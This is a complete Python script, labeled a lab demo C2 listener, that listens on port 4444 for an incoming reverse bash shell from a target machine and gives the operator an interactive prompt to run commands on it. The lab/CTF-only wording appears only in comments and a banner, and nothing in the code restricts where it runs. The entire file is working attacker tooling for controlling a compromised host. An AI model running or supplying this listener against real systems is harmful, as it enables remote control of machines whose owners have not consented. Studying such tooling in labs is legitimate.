#!/usr/bin/env python3
"""
demo_attacker/listener.py — Lab Demo C2 listener (port 4444).

Receives a reverse bash shell from the target VM and provides an interactive
prompt. This is a controlled demo receiver: it does NOT accept incoming
commands from any source other than the operator's local stdin, and it does
NOT relay or forward sessions. For lab/CTF use only.
"""
import select
import socket
import sys
import threading

PORT = 4444
BANNER = (
    "\n[demo-c2] *** LAB DEMO C2 LISTENER — controlled environment only ***\n"
    "[demo-c2] Connection received. Type commands below (Ctrl-C to exit).\n"
    "[demo-c2] ---------------------------------------------------------------\n"
)


def pipe_output(sock: socket.socket, stop_event: threading.Event) -> None:
    """Read from socket and write to stdout."""
    while not stop_event.is_set():
        try:
            r, _, _ = select.select([sock], [], [], 0.2)
            if r:
                data = sock.recv(4096)
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
        except OSError:
            break


def pipe_input(sock: socket.socket, stop_event: threading.Event) -> None:
    """Read from stdin and send to socket."""
    while not stop_event.is_set():
        try:
            r, _, _ = select.select([sys.stdin], [], [], 0.2)
            if r:
                line = sys.stdin.readline()
                if not line:
                    break
                sock.sendall(line.encode())
        except OSError:
            break


def handle(conn: socket.socket, addr: tuple) -> None:
    print(BANNER, flush=True)
    stop = threading.Event()
    t_out = threading.Thread(target=pipe_output, args=(conn, stop), daemon=True)
    t_in  = threading.Thread(target=pipe_input,  args=(conn, stop), daemon=True)
    t_out.start()
    t_in.start()
    try:
        t_out.join()
    finally:
        stop.set()
        conn.close()
        print("\n[demo-c2] Session closed.", flush=True)


def main() -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(1)
    print(f"[demo-c2] listening on 0.0.0.0:{PORT} — waiting for reverse shell ...", flush=True)
    try:
        while True:
            conn, addr = srv.accept()
            print(f"[demo-c2] incoming connection from {addr[0]}:{addr[1]}", flush=True)
            handle(conn, addr)
    except KeyboardInterrupt:
        print("\n[demo-c2] Shutting down.", flush=True)
    finally:
        srv.close()


if __name__ == "__main__":
    main()
